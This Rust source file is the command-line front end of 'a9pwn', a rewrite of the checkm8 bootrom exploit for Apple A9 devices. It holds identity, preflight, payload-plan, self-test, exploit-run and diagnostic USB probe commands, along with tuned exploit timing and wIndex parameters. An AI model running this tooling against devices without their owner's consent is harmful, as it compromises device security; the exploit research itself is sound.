//! a9pwn — CLI. OWNER: **Lead only.** This file is the enforcing contract for
//! every module: it calls the frozen signatures, so if it compiles, the modules
//! agree with `INTERFACE.md`.

use std::path::PathBuf;
use std::process::ExitCode;
use std::time::{Duration, Instant};

use a9pwn::payload;
use a9pwn::stages::{self, RunOptions, SetupBudget};
use a9pwn::trace::Tracer;
use a9pwn::types::{DeviceIdentity, ResetCapability, RunOutcome, Stage, XferStatus};
use a9pwn::usb::{CtrlReq, Transport};
use a9pwn::verdict;

const EXIT_OK: u8 = 0;
const EXIT_NO_DEVICE: u8 = 1;
const EXIT_BAD_ARGS: u8 = 2;
const EXIT_UNSUPPORTED: u8 = 3;
const EXIT_PREFLIGHT_REFUSED: u8 = 4;
const EXIT_EXHAUSTED: u8 = 5;
const EXIT_TRANSPORT: u8 = 6;

fn usage() {
    println!(
        "a9pwn — gaster's checkm8, rewritten in Rust with instrumentation built in\n\
         \n\
         USAGE: a9pwn <command> [options]\n\
         \n\
         COMMANDS\n\
           ident       read-only: identity, bound driver, reset capability\n\
           preflight   ident, then refuse to continue if resets are not real\n\
           reset       bare port reset, reporting what it actually did\n\
           plan        build the payload and print every field; send NOTHING\n\
           selftest    offline checks: blob hashes, struct sizes, config table\n\
           run         THE EXPLOIT. Writes to the device.\n\
         \n\
         OPTIONS\n\
           --rounds N                 max stage rounds (default 64)\n\
           --dry-run                  build everything, send nothing\n\
           --verbose | -v             per-transfer lines\n\
           --trace FILE               JSONL event log\n\
           --stage reset|setup|spray|patch   run one stage only\n\
           --allow-winusb             proceed even though resets are no-ops\n\
           --leak-windex N | --leak-windex-ipwndfu   spray leak wIndex: N (decimal or 0x hex,\n\
           default 0x0A = gaster.c:52), or 0x00 for the ipwndfu lineage — a probe,\n\
           not a second opinion\n\
           --pad-timeout-ms N         the PAD request's own timeout, ms (default 40).\n\
           Deliberately separate from --usb-timeout-ms: the pad is the pass\n\
           condition and this device answers it in 21-37 ms (measured), while\n\
           --usb-timeout-ms sets the abort windows, where a larger value lets\n\
           the whole DNLOAD complete and destroys the sweep.\n\
           --stop-after-setup-stall   exit as soon as SETUP passes (diagnostic)\n\
           --setup-budget N           max SETUP attempts before giving up (default 20000)\n\
           --settle-ms N              sleep between rounds (default 0)
           --send                     probe-clrstatus: actually transmit (default is a dry run)
           --watch-ms N               probe-clrstatus: presence-watch window (default 3000)\n\
         \n\
         EXIT CODES  0 ok/ pwned · 1 no device · 2 bad arguments · 3 unsupported chip\n\
                     4 preflight refused · 5 exhausted · 6 transport error"
    );
}

fn flag(args: &[String], name: &str) -> bool {
    args.iter().any(|a| a == name)
}

fn value(args: &[String], name: &str) -> Option<String> {
    args.iter()
        .position(|a| a == name)
        .and_then(|i| args.get(i + 1))
        .cloned()
}

fn number(args: &[String], name: &str) -> Option<u64> {
    value(args, name).and_then(|v| v.parse::<u64>().ok())
}

/// gaster's own defaults (gaster.c:1631-1638).
const USB_TIMEOUT_MS: u32 = 5;
const ABORT_TIMEOUT_MIN_MS: u32 = 0;

fn build_options(args: &[String]) -> Result<RunOptions, String> {
    let stage_filter = match value(args, "--stage") {
        Some(s) => match Stage::parse(&s) {
            Some(st) => Some(st),
            None => {
                return Err(format!(
                    "--stage '{s}' is not one of reset|setup|spray|patch"
                ))
            }
        },
        None => None,
    };

    /// Decimal or 0x-prefixed hex, because the value that matters is a wire
    /// constant and reading it in hex is how it appears in the reference.
    fn parse_u16(s: &str) -> Result<u16, String> {
        let t = s.trim();
        let parsed = match t.strip_prefix("0x").or_else(|| t.strip_prefix("0X")) {
            Some(hex) => u16::from_str_radix(hex, 16),
            None => t.parse::<u16>(),
        };
        parsed.map_err(|e| e.to_string())
    }

    // gaster's 0x0A is the cited default (gaster.c:52, used at :866/:875/:886).
    // `--leak-windex` exists because the alternative this crate carried is built
    // on a false claim: `LEAK_WINDEX_IPWNDFU` is 0x00, but ipwndfu's
    // `checkm8.py` passes 0x40A and has no row for CPID 0x8000/0x8003 at all —
    // so it is a probe to be able to run, not a second opinion
    // (`a9pwn/docs/VERIFICATION-live-run.md` B3/V08).
    let leak_windex = match value(args, "--leak-windex") {
        Some(v) => parse_u16(&v).map_err(|e| format!("--leak-windex {v:?}: {e}"))?,
        None if flag(args, "--leak-windex-ipwndfu") => a9pwn::stages::LEAK_WINDEX_IPWNDFU,
        None => a9pwn::stages::LEAK_WINDEX_GASTER,
    };

    // The pad's timeout is deliberately NOT `usb_timeout_ms`. The pad request IS
    // the pass condition (gaster.c:853 asks whether it STALLs), and this device
    // answers it in 21-37 ms — MEASURED on two independent datasets (run 2: six
    // completions at 21.4-27.9 ms in 154 attempts; run 4: two at 21.5 and
    // 36.6 ms in 14,565). With a nominal 5 ms we were measuring the host's
    // impatience, not the device's answer. `usb_timeout_ms` still controls the
    // abort windows, where a larger value would let the whole 2048-byte DNLOAD
    // complete and destroy the sweep.
    let pad_timeout_ms = number(args, "--pad-timeout-ms")
        .unwrap_or_else(|| RunOptions::default().pad_timeout_ms as u64)
        as u32;

    let opts = RunOptions {
        max_rounds: number(args, "--rounds").unwrap_or(64) as u32,
        usb_timeout_ms: number(args, "--usb-timeout-ms").unwrap_or(USB_TIMEOUT_MS as u64) as u32,
        abort_timeout_min_ms: number(args, "--abort-min-ms")
            .unwrap_or(ABORT_TIMEOUT_MIN_MS as u64) as u32,
        pad_timeout_ms,
        leak_windex,
        dry_run: flag(args, "--dry-run"),
        verbose: flag(args, "--verbose") || flag(args, "-v"),
        trace_path: value(args, "--trace").map(PathBuf::from),
        allow_winusb: flag(args, "--allow-winusb"),
        stage_filter,
        setup_budget: SetupBudget {
            max_attempts: number(args, "--setup-budget").unwrap_or(20_000),
            max_millis: 600_000,
        },
        stop_after_setup_stall: flag(args, "--stop-after-setup-stall"),
        probe_setup_state: flag(args, "--probe-setup-state"),
        settle_ms: number(args, "--settle-ms").unwrap_or(0) as u32,
    };
    if opts.usb_timeout_ms < 1 {
        return Err("--usb-timeout-ms must be >= 1".to_string());
    }
    if opts.abort_timeout_min_ms > opts.usb_timeout_ms {
        return Err(format!(
            "--abort-min-ms ({}) must be <= --usb-timeout-ms ({})",
            opts.abort_timeout_min_ms, opts.usb_timeout_ms
        ));
    }
    Ok(opts)
}

fn print_identity(id: &DeviceIdentity, driver: a9pwn::types::DriverClass, cap: ResetCapability) {
    // §9.8: the ECID is device-unique and belongs in no log. The descriptor is
    // printed masked so the SRTG/CPID parts stay readable for diagnosis.
    println!("  serial        : {}", a9pwn::trace::redact_ecid(&id.serial));
    println!("  CPID          : {}", id.cpid_hex());
    println!(
        "  CPRV / BDID   : {} / {}",
        id.cprv.map(|v| format!("0x{v:02X}")).unwrap_or_else(|| "-".into()),
        id.bdid.map(|v| format!("0x{v:02X}")).unwrap_or_else(|| "-".into())
    );
    println!(
        "  SRTG          : {}",
        id.srtg.clone().unwrap_or_else(|| "(absent - not SecureROM DFU?)".into())
    );
    println!(
        "  ECID          : {}",
        id.ecid.map(|e| format!("...{:04X} (masked)", e & 0xFFFF)).unwrap_or_else(|| "-".into())
    );
    println!("  A9 target     : {}", if id.is_a9() { "yes" } else { "NO" });
    println!("  driver service: {}", driver.as_str());
    println!("  reset         : {}", cap.as_str());
    println!(
        "  PWND marker   : {}",
        if id.is_pwned() { "PRESENT - device is pwned" } else { "absent" }
    );
}

fn main() -> ExitCode {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let command = args.first().cloned().unwrap_or_else(|| "ident".to_string());

    if flag(&args, "--help") || flag(&args, "-h") || command == "help" {
        usage();
        return ExitCode::from(EXIT_OK);
    }

    match command.as_str() {
        // ---------------------------------------------------------------- ident
        "ident" | "preflight" => {
            println!("a9pwn ident");
            println!();
            let t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    println!("  no DFU device: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            let id = t.identity();
            let driver = t.driver_class();
            let cap = t.reset_capability();
            print_identity(&id, driver, cap);
            // The negotiated speed decides how to read a 0-byte aborted transfer:
            // at full speed 2048 bytes needs ~32 ms of 64-byte frames, so no
            // 0..5 ms abort window could ever report a byte; at high speed a 4-5 ms
            // window can carry all 2048, so a 0-byte count there means the DNLOAD
            // never reached the wire. Measured at open by usb.rs, not inferred.
            println!(
                "  usb speed     : {} (negotiated, measured at open)",
                a9pwn::usb::speed_name(t.device_speed())
            );

            if command == "preflight" && cap != ResetCapability::Real {
                println!();
                let v = verdict::classify(
                    &RunOutcome::Aborted("preflight refused".into()),
                    &Default::default(),
                    &id,
                    driver,
                    cap,
                );
                println!("  VERDICT  {}  [{}]", v.headline, v.code);
                for e in &v.evidence {
                    println!("    evidence: {e}");
                }
                println!("    next    : {}", v.next_action);
                return ExitCode::from(EXIT_PREFLIGHT_REFUSED);
            }
            ExitCode::from(EXIT_OK)
        }

        // ---------------------------------------------------------------- reset
        "reset" => {
            println!("a9pwn reset");
            let mut t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    println!("  no DFU device: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            match t.reset() {
                Ok(r) => {
                    println!("  libusb rc     : {}", r.libusb_rc);
                    println!("  capability    : {}", r.capability.as_str());
                    println!("  took          : {} us", r.micros);
                    println!("  what happened : {}", r.note);
                    ExitCode::from(EXIT_OK)
                }
                Err(e) => {
                    println!("  reset failed: {e}");
                    ExitCode::from(EXIT_TRANSPORT)
                }
            }
        }

        // ----------------------------------------------------------------- plan
        "plan" => {
            println!("a9pwn plan (DRY RUN - nothing will be sent)");
            println!();
            let t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    println!("  no DFU device: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            let id = t.identity();
            print_identity(&id, t.driver_class(), t.reset_capability());
            println!();

            if let Err(e) = payload::verify_blob_hashes() {
                println!("  BLOB VERIFICATION FAILED: {e}");
                return ExitCode::from(EXIT_TRANSPORT);
            }
            println!("  blob sha256   : both blobs verified");

            let (cfg, kind) = match a9pwn::config::config_for_identity(&id) {
                Ok(v) => v,
                Err(e) => {
                    println!("  no config for this device: {e}");
                    return ExitCode::from(EXIT_UNSUPPORTED);
                }
            };
            println!("  config        : {} ({:?})", cfg.name, kind);
            println!("  overwrite_pad : 0x{:X}", cfg.overwrite_pad);
            println!("  insecure_base : 0x{:X}", cfg.insecure_memory_base);
            println!();

            match payload::build_payload(&cfg, kind) {
                Ok(built) => {
                    println!("  payload       : {} bytes", built.blob.len());
                    println!("  overwrite     : {} bytes", built.overwrite.len());
                    println!("  blob sha256   : {}", built.blob_sha256);
                    println!();
                    println!("  {:<6} {:<6} {:<22} value", "off", "len", "field");
                    for f in &built.fields {
                        println!(
                            "  0x{:03X}  {:<6} {:<22} 0x{:016X}",
                            f.off, f.len, f.label, f.value
                        );
                    }
                }
                Err(e) => {
                    println!("  payload build failed: {e}");
                    return ExitCode::from(EXIT_TRANSPORT);
                }
            }
            ExitCode::from(EXIT_OK)
        }

        // ------------------------------------------------------------- selftest
        "selftest" => {
            println!("a9pwn selftest (offline; does not touch the device)");
            let mut failures = 0u32;

            match payload::verify_blob_hashes() {
                Ok(()) => println!("  [ok]   blob sha256 verified"),
                Err(e) => {
                    println!("  [FAIL] blob sha256: {e}");
                    failures += 1;
                }
            }

            println!(
                "  [info] sizeof(A9)={} sizeof(handle_checkm8_request)={}",
                payload::A9_STRUCT_SIZE,
                payload::HANDLE_CHECKM8_STRUCT_SIZE
            );

            let configs = a9pwn::config::all_configs();
            println!("  [info] {} SoC config(s) in the table", configs.len());
            for c in configs {
                println!(
                    "         cpid=0x{:04X} cprv=0x{:02X} {} pad=0x{:X} large_leak={} hole={}",
                    c.cpid, c.cprv, c.name, c.overwrite_pad, c.large_leak, c.hole
                );
            }
            if configs.iter().all(|c| c.cpid != 0x8003) {
                println!("  [FAIL] no config for CPID 0x8003 (our device)");
                failures += 1;
            }

            if failures == 0 {
                println!();
                println!("  selftest: PASS");
                ExitCode::from(EXIT_OK)
            } else {
                println!();
                println!("  selftest: {failures} FAILURE(S)");
                ExitCode::from(EXIT_TRANSPORT)
            }
        }

        // ------------------------------------------------------------------ run
        "run" => {
            let opts = match build_options(&args) {
                Ok(o) => o,
                Err(e) => {
                    eprintln!("a9pwn: {e}");
                    return ExitCode::from(EXIT_BAD_ARGS);
                }
            };

            // Preflight gate. Running the exploit with a driver whose reset is a
            // no-op cannot succeed, and failing at the end with "not pwned" would
            // accuse the exploit. Refuse up front instead.
            if let Ok(t) = Transport::open_first_dfu() {
                let cap = t.reset_capability();
                if (cap != ResetCapability::Real) && !opts.allow_winusb {
                    let id = t.identity();
                    let v = verdict::classify(
                        &RunOutcome::Aborted("preflight: reset is not real".into()),
                        &Default::default(),
                        &id,
                        t.driver_class(),
                        cap,
                    );
                    println!("REFUSING TO RUN");
                    println!("  {}  [{}]", v.headline, v.code);
                    for e in &v.evidence {
                        println!("    evidence: {e}");
                    }
                    println!("    next    : {}", v.next_action);
                    println!();
                    println!("  Override with --allow-winusb only to prove the failure mode.");
                    return ExitCode::from(EXIT_PREFLIGHT_REFUSED);
                }
            }

            // ONE tracer, ONE writer. `run_with_tracer` records run_start/run_end,
            // flushes and prints the summary; THIS tracer owns opts.trace_path and
            // is the counter set the verdict below is classified against.
            // Previously main.rs and stages::run each opened the same path: the
            // JSONL interleaved into a corrupted line (`{"seq":2,"st{"seq":2,…`)
            // and the verdict was classified against an empty counter set while
            // the real counters sat in the other tracer.
            let mut tracer = match Tracer::new(opts.trace_path.clone(), opts.verbose) {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("a9pwn: cannot open trace file: {e}");
                    return ExitCode::from(EXIT_BAD_ARGS);
                }
            };

            let outcome = stages::run_with_tracer(opts.clone(), &mut tracer);

            let counters = tracer.counters();

            // The verdict needs the device's own identity, so re-read it. After a
            // successful pwn the serial carries PWND:[checkm8].
            let (id, driver, cap) = match Transport::open_first_dfu() {
                Ok(t) => (t.identity(), t.driver_class(), t.reset_capability()),
                Err(_) => (DeviceIdentity::default(), a9pwn::types::DriverClass::Unknown,
                           ResetCapability::Unknown),
            };
            if id.is_pwned() {
                println!();
                println!("  PWND marker is present in the serial descriptor.");
            }

            let v = verdict::classify(&outcome, &counters, &id, driver, cap);
            println!();
            println!("  VERDICT  {}  [{}]", v.headline, v.code);
            for e in &v.evidence {
                println!("    evidence: {e}");
            }
            println!("    next    : {}", v.next_action);
            println!("    confidence: {:?}", v.confidence);

            match outcome {
                RunOutcome::Pwned => ExitCode::from(EXIT_OK),
                RunOutcome::NoDevice => ExitCode::from(EXIT_NO_DEVICE),
                RunOutcome::Unsupported(_) => ExitCode::from(EXIT_UNSUPPORTED),
                RunOutcome::Exhausted { .. } => ExitCode::from(EXIT_EXHAUSTED),
                RunOutcome::Aborted(_) => ExitCode::from(EXIT_TRANSPORT),
            }
        }

        // DIAGNOSTIC, Lead-only. LINUX-HANDOFF §6 **E2**: a BARE `DFU_CLRSTATUS`,
        // with no spray and no exploit around it, to isolate the §4.4 observation
        // that this device appears to leave the bus after a `CLR_STATUS`.
        //
        // WHAT THE HANDOFF ALREADY MEASURED, and why this is still worth running:
        // across every Windows trace, `DFU_CLRSTATUS` (`bm=0x21 b=4`) was sent 11
        // times; the 10 followed by any device read died immediately afterwards,
        // and the 11 traces that sent none had zero fast resets. gaster sends it in
        // exactly two places — the RESET stage's failure path (`gaster.c:843`) and
        // the last line of the A9 spray (`gaster.c:910`) — and those are exactly
        // the two places the device dies. That inference is from correlation across
        // traces. This command makes it a single-variable experiment: one bare
        // `CLR_STATUS` against a device nobody else has touched.
        //
        // The finding would be about the BOOTROM, not about our code: if a bare
        // `CLR_STATUS` drops a healthy device, then the drop in a failed run is not
        // the exploit's fault and must not be read as one.
        //
        // DRY BY DEFAULT. `--send` is required to transmit, because a `CLR_STATUS`
        // is state-changing and can cost the device. The dry run still reads the
        // identity and the DFU state and prints the exact request it would send, so
        // the tool is exercised end to end without spending the device.
        "probe-clrstatus" => {
            let send = flag(&args, "--send");
            let length = number(&args, "--length").unwrap_or(0) as u16;
            let timeout_ms = number(&args, "--timeout-ms").unwrap_or(1_000) as u32;
            let watch_ms = number(&args, "--watch-ms").unwrap_or(3_000);

            println!("a9pwn probe-clrstatus — a BARE DFU_CLRSTATUS, nothing else");
            println!();

            let mut t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    println!("  no DFU device: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            let id_before = t.identity();
            let (bus0, addr0) = t.bus_address();
            let pwnd_before = id_before.is_pwned();
            println!(
                "  device        : bus {bus0} addr {addr0}  CPID={}  PWND={}",
                id_before.cpid_hex(),
                if pwnd_before { "PRESENT" } else { "absent" }
            );
            println!(
                "  serial        : {} chars -> {} descriptor bytes (MEASURED: stock 98 chars / 198 B; \
                 pwned 113 chars / 228 B)",
                id_before.serial.len(),
                2 + 2 * id_before.serial.len()
            );

            let (state0, how0) = read_dfu_state(&mut t, timeout_ms);
            println!("  DFU state pre : {how0}");

            let req = CtrlReq::new(0x21, a9pwn::DFU_CLRSTATUS, 0, 0, length);
            println!(
                "  request       : bm=0x21 b=DFU_CLRSTATUS(4) wValue=0 wIndex=0 wLength={length}"
            );

            if !send {
                println!();
                println!("  DRY RUN — nothing was sent. Re-run with `--send` to transmit.");
                println!(
                    "  (A bare CLR_STATUS can drop this device; the dry run reads the identity \
                     and the DFU state and stops there.)"
                );
                return ExitCode::from(EXIT_OK);
            }

            let r = if length == 0 {
                t.control_no_data(req, timeout_ms)
            } else {
                let mut zeros = vec![0u8; length as usize];
                t.control(req, &mut zeros, timeout_ms)
            };
            println!(
                "  sent          : {}  transferred={}/{}  libusb_rc={}  {} us",
                r.status.as_str(),
                r.transferred,
                length,
                r.libusb_rc,
                r.micros
            );

            // Read the state again through the SAME handle first: if the device has
            // left the bus, that read is where it shows, and the error code is the
            // measurement (an unread state is not a state).
            let (state1, how1) = read_dfu_state(&mut t, timeout_ms);
            println!("  DFU state post: {how1}");
            drop(t);

            // Then watch presence with FRESH handles. The handoff is explicit that
            // libusb caches string descriptors per handle, so a new open is the only
            // honest way to re-read the marker after a re-enumeration.
            let watch = watch_presence(addr0, watch_ms);
            println!(
                "  presence      : {}",
                match (watch.disappeared, watch.absence_ms, watch.returned_addr) {
                    (false, _, _) => format!(
                        "stayed present for the whole {watch_ms} ms window (no drop)"
                    ),
                    (true, ms, Some(a)) => format!(
                        "LEFT the bus and came back after {ms} ms at addr {a}{}",
                        if a != addr0 { " (a NEW address — re-enumeration)" } else { "" }
                    ),
                    (true, ms, None) => format!(
                        "LEFT the bus after ~{ms} ms and had NOT returned within {watch_ms} ms"
                    ),
                }
            );
            println!(
                "  PWND after    : {}",
                match watch.pwnd_after {
                    Some(true) => "still present",
                    Some(false) => "ABSENT - the marker is gone",
                    None => "unread (the device did not come back)",
                }
            );
            println!();
            println!("  what this means:");
            println!(
                "    A drop here is a property of the BOOTROM's CLR_STATUS handling, not of the \
                 exploit: nothing else was sent. gaster issues this same request at \
                 `gaster.c:843` and `gaster.c:910`, so a drop is either survivable reference \
                 behaviour or something gaster's own `wait_usb_handle` (`gaster.c:202-218`) \
                 absorbs. Do not conclude the device is bricked, and do not conclude our stage \
                 code caused it."
            );
            println!(
                "    state pre={} post={}",
                state0.map(|s| a9pwn::usb::dfu_state_name(s)).unwrap_or("unread"),
                state1.map(|s| a9pwn::usb::dfu_state_name(s)).unwrap_or("unread")
            );
            ExitCode::from(EXIT_OK)
        }

        // DIAGNOSTIC, Lead-only, read-only. Aborts a GET_DESCRIPTOR(3) IN read,
        // so a zero cannot be blamed on the device refusing. Settles whether
        // libusb reports a partial byte count for a CANCELLED control transfer,
        // which decides whether our `abort_xfer=0/2048` means "the device took
        // nothing" or "the API reports nothing". Never on the exploit path; no
        // reset, no DNLOAD.
        //
        // MEASURED 2026-10-03 (Linux) — three corrections to the above, all of
        // which this branch now handles honestly:
        //   1. The index this probe sends is `FALLBACK_STRING_INDEX` (3), which
        //      THIS device does not answer at all. A "0 transferred" from that
        //      request is therefore expected for the trivial reason that no data
        //      ever existed — not because libusb hides a partial count. The probe
        //      needs the declared index (4) before it can answer its own question.
        //   2. `--deadline-ms 8` does NOT cut the read on Linux: usbmon measured
        //      the whole 198-byte descriptor completing in ~150 us. A transfer
        //      that COMPLETES is not a cancelled transfer, and reading its
        //      non-zero count as "partials survive cancellation" would be a wrong
        //      value wearing a measurement's clothes.
        //   3. Cancelling this request WEDGES EP0 on this bootrom: the device then
        //      NAKs even the index it used to answer, until a port reset clears it
        //      (MEASURED: one `a9pwn reset`, 237,818 us). So this probe is no
        //      longer "read-only" in practice — it is read-only on the device's
        //      flash/state, but it can cost a reset. Recorded in RUNG1-EVIDENCE.md §3.
        "probe-partial-count" => {
            let mut t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("a9pwn: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            // The deadline must EXCEED the device's answer latency but cut mid-data,
            // or a zero is expected for the trivial reason that nothing had arrived.
            // This device answers a string-descriptor read in ~6 ms and moves ~1.12 ms
            // per 64-byte packet, so 8 ms catches roughly two packets in flight.
            // `--deadline-ms 1` is a valid test only of "nothing yet".
            let deadline = number(&args, "--deadline-ms").unwrap_or(8) as u32;
            let r = t.diagnostic_partial_count_probe(deadline);
            println!("  probe       : {}", r.one_line());
            println!(
                "  transferred : {} of {} (libusb's own number)",
                r.transferred, r.requested
            );
            println!("  status      : {:?}  libusb_rc={}", r.status, r.libusb_rc);
            // The question is what libusb reports for a transfer that was CUT.
            // A completed transfer answers a different question, so it must not be
            // allowed to produce the cancellation conclusion.
            match r.status {
                a9pwn::types::XferStatus::Cancelled if r.transferred > 0 => println!(
                    "  => PARTIALS SURVIVE CANCELLATION: libusb reports a real count for a \
                     cancelled control transfer, so abort_xfer=0 means the device took nothing."
                ),
                a9pwn::types::XferStatus::Cancelled => println!(
                    "  => NO PARTIAL ON A CUT TRANSFER: libusb reports 0 for a cancelled transfer, \
                     so abort_xfer=0 cannot tell us what the device took."
                ),
                other => println!(
                    "  => NOT A VALID TEST OF CANCELLATION: the transfer ended {other:?}, not \
                     Cancelled, so whatever count it reports describes a transfer that was \
                     allowed to finish. Shorten --deadline-ms until the status is Cancelled, or \
                     (better) measure the 0x800-byte DNLOAD on the real exploit path, where the \
                     window is known to cut."
                ),
            }
            ExitCode::from(EXIT_OK)
        }

        other => {
            eprintln!("a9pwn: unknown command '{other}'");
            usage();
            ExitCode::from(EXIT_BAD_ARGS)
        }
    }
}

/// One `DFU_GETSTATUS`. Returns `(bState, human line)`.
///
/// `bState` is byte 4 of the 6-byte status response (DFU 1.1 §6.1.2:
/// `bStatus`, `bwPollTimeout[3]`, `bState`, `iString`). The `Option` is
/// load-bearing: "the state could not be read" and "the state is X" are different
/// facts, and collapsing them is how an unread value becomes a wrong one — the
/// Windows session reported `DFU state 5 -> 5` from a read that had not happened.
fn read_dfu_state(t: &mut Transport, timeout_ms: u32) -> (Option<u8>, String) {
    let req = CtrlReq::new(0xA1, a9pwn::DFU_GETSTATUS, 0, 0, 6);
    let mut buf = [0u8; 6];
    let r = t.control(req, &mut buf, timeout_ms);
    if r.status == XferStatus::Ok && r.transferred >= 6 {
        let s = buf[4];
        (
            Some(s),
            format!(
                "{} (0x{s:02X})  [read OK, {} bytes, {} us]",
                a9pwn::usb::dfu_state_name(s),
                r.transferred,
                r.micros
            ),
        )
    } else {
        (
            None,
            format!(
                "UNREAD — {} (libusb_rc={}) after {} us. An unread state is not a state: this is \
                 what a device that has left the bus looks like",
                r.status.as_str(),
                r.libusb_rc,
                r.micros
            ),
        )
    }
}

struct PresenceWatch {
    disappeared: bool,
    absence_ms: u64,
    returned_addr: Option<u8>,
    pwnd_after: Option<bool>,
}

/// Poll for the device with FRESH handles and report wall-clock absence.
///
/// Wall clock, not an attempt count: LINUX-HANDOFF §4.8 MEASURED that "19 open
/// attempts" was really 285-292 ms, and a count of opens is a property of this
/// loop's pacing, not of the device.
fn watch_presence(addr0: u8, budget_ms: u64) -> PresenceWatch {
    let start = Instant::now();
    let mut w = PresenceWatch {
        disappeared: false,
        absence_ms: 0,
        returned_addr: None,
        pwnd_after: None,
    };
    let mut left_at: Option<Instant> = None;
    while start.elapsed() < Duration::from_millis(budget_ms) {
        match Transport::open_first_dfu() {
            Ok(t) => {
                let (_, addr) = t.bus_address();
                if let Some(t0) = left_at.take() {
                    w.absence_ms = t0.elapsed().as_millis() as u64;
                    w.returned_addr = Some(addr);
                }
                // Only read the marker once the device is back and settled; a read
                // racing a re-enumeration is how "PWND absent" became a NULL READ
                // (HANDOFF §4.6).
                if w.disappeared && w.returned_addr.is_some() {
                    w.pwnd_after = Some(t.identity().is_pwned());
                    if addr != addr0 {
                        return w;
                    }
                    // Same address: keep watching briefly in case it moves again.
                }
            }
            Err(_) => {
                if !w.disappeared {
                    w.disappeared = true;
                    left_at = Some(Instant::now());
                } else if left_at.is_none() {
                    left_at = Some(Instant::now());
                }
            }
        }
        std::thread::sleep(Duration::from_millis(25));
    }
    w
}
